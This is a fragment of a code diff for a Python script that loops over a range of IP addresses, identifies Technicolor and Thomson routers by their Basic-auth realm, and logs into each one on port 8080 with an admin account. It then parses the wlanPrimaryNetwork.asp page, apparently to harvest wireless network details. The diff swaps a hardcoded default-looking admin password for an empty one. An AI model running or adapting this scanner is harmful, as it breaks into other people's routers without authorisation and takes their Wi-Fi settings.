@@ -29,7 +29,7 @@ for i in range(180,201):
                         n=r.headers['WWW-Authenticate']=='Basic realm="Technicolor"'
                         if n==True: ##Technicolor
                             tech=tech+1
-                            r2=requests.get('http://'+h+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.4)
+                            r2=requests.get('http://'+h+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', ''), timeout=0.4)
                             parser1=r2.content
                             bs1=BeautifulSoup(parser1, "html.parser")
                             for td in bs1.find_all("td", align="middle"):
@@ -39,8 +39,8 @@ for i in range(180,201):
                         else: ##Thomson
                             tom=tom+1
                             
-                            r3=requests.get('http://'+h+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.4)
-                            r4=requests.get('http://'+h+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.4)
+                            r3=requests.get('http://'+h+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', ''), timeout=0.4)
+                            r4=requests.get('http://'+h+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', ''), timeout=0.4)
 
                             
                             parser=r4.content
